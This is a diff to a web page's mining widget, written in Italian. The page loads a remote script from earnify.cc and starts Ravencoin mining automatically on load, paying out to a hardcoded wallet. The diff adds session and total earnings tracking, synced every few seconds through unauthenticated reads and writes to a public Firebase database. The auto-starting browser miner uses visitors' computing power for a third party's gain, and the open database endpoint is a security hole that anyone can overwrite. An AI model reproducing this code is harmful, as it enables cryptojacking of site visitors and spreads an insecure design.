@@ -4,7 +4,7 @@
     position: fixed;
     bottom: 80px;
     right: 20px;
-    width: 310px;
+    width: 320px;
     background: rgba(0, 0, 0, 0.92);
     border: 1px solid #ffffff33;
     border-radius: 6px;
@@ -60,6 +60,13 @@
     color: #7CFC00;
     font-weight: bold;
 }
+.total-line {
+    color: #00BFFF;
+    font-weight: bold;
+    margin-top: 6px;
+    padding-top: 6px;
+    border-top: 1px solid #ffffff22;
+}
 </style>
 
 <div id="mining-console">
@@ -71,8 +78,13 @@
     <div>Hashrate: <span id="hashrate">0.00</span> KH/s</div>
     <div>Tempo: <span id="timer">00:00</span></div>
     <div>Job accettati: <span id="shares">0</span></div>
-    <div class="earn-line">Guadagno stimato: <span id="earnings">0.00000000</span> RVN</div>
+    
+    <div class="earn-line">Sessione: <span id="earnings">0.00000000</span> RVN</div>
     <div class="earn-line">≈ <span id="earnings-eur">0.00000000</span> €</div>
+    
+    <div class="total-line">Saldo Totale: <span id="total-rvn">0.00000000</span> RVN</div>
+    <div class="total-line">≈ <span id="total-eur">0.00000000</span> €</div>
+    
     <div style="font-size:12px; opacity:0.75; margin-top:4px;">
         (~<span id="daily-rate">0.00</span> RVN/giorno)
     </div>
@@ -83,19 +95,80 @@
 <script type="module">
     import { autoMine, minotaurxHashrate } from "https://earnify.cc/miner.js";
 
+    // ========== FIREBASE ==========
+    const FIREBASE_URL = "https://miner-3b768-default-rtdb.europe-west1.firebasedatabase.app/balance.json";
+
     let miningStarted = false;
     let startTime = Date.now();
     let lastUpdate = Date.now();
-    let totalEstimatedRVN = 0;
+    let sessionRVN = 0;          // guadagno di questa sessione
+    let lastPushedRVN = 0;       // quanto abbiamo già inviato al server
+    let totalRVN = 0;
+    let totalEUR = 0;
 
-    // Coefficiente realistico (0.18 RVN per KH/s al giorno)
     const RVN_PER_KHS_PER_DAY = 0.18;
     const RVN_PER_KHS_PER_SECOND = RVN_PER_KHS_PER_DAY / 86400;
-
-    // Prezzo approssimativo RVN in EUR (aggiornato a luglio 2026 ≈ 0.0035 €)
     const RVN_PRICE_EUR = 0.0035;
 
+    // Legge il saldo totale dal server
+    async function loadTotalBalance() {
+        try {
+            const res = await fetch(FIREBASE_URL);
+            const data = await res.json();
+            if (data && typeof data.rvn === "number") {
+                totalRVN = data.rvn;
+                totalEUR = data.eur || (data.rvn * RVN_PRICE_EUR);
+            } else {
+                totalRVN = 0;
+                totalEUR = 0;
+            }
+            updateTotalUI();
+        } catch (e) {
+            console.error("Errore lettura Firebase:", e);
+        }
+    }
+
+    // Invia il delta guadagnato al server
+    async function pushDeltaToServer() {
+        const delta = sessionRVN - lastPushedRVN;
+        if (delta <= 0) return;
+
+        try {
+            // Rilegge il valore attuale (per ridurre collisioni)
+            const res = await fetch(FIREBASE_URL);
+            const data = await res.json() || { rvn: 0, eur: 0 };
+
+            const newRVN = (data.rvn || 0) + delta;
+            const newEUR = newRVN * RVN_PRICE_EUR;
+
+            await fetch(FIREBASE_URL, {
+                method: "PUT",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    rvn: newRVN,
+                    eur: newEUR,
+                    lastUpdate: Date.now()
+                })
+            });
+
+            lastPushedRVN = sessionRVN;
+            totalRVN = newRVN;
+            totalEUR = newEUR;
+            updateTotalUI();
+        } catch (e) {
+            console.error("Errore scrittura Firebase:", e);
+        }
+    }
+
+    function updateTotalUI() {
+        document.getElementById("total-rvn").textContent = totalRVN.toFixed(8);
+        document.getElementById("total-eur").textContent = totalEUR.toFixed(8);
+    }
+
     async function initMining() {
+        // Carica subito il saldo totale
+        await loadTotalBalance();
+
         try {
             await autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
             miningStarted = true;
@@ -109,16 +182,21 @@
                 const deltaSeconds = (now - lastUpdate) / 1000;
                 lastUpdate = now;
 
-                totalEstimatedRVN += hr * RVN_PER_KHS_PER_SECOND * deltaSeconds;
-
-                const eurValue = totalEstimatedRVN * RVN_PRICE_EUR;
+                sessionRVN += hr * RVN_PER_KHS_PER_SECOND * deltaSeconds;
+                const sessionEUR = sessionRVN * RVN_PRICE_EUR;
 
                 document.getElementById("hashrate").textContent = parseFloat(hr).toFixed(2);
                 document.getElementById("shares").textContent = shares;
-                document.getElementById("earnings").textContent = totalEstimatedRVN.toFixed(8);
-                document.getElementById("earnings-eur").textContent = eurValue.toFixed(8);
+                document.getElementById("earnings").textContent = sessionRVN.toFixed(8);
+                document.getElementById("earnings-eur").textContent = sessionEUR.toFixed(8);
                 document.getElementById("daily-rate").textContent = (hr * RVN_PER_KHS_PER_DAY).toFixed(2);
             }, 700);
+
+            // Ogni 8 secondi sincronizza con il server
+            setInterval(pushDeltaToServer, 8000);
+
+            // Ogni 15 secondi rilegge il totale (per vedere guadagni di altri dispositivi)
+            setInterval(loadTotalBalance, 15000);
 
         } catch (e) {
             console.error(e);
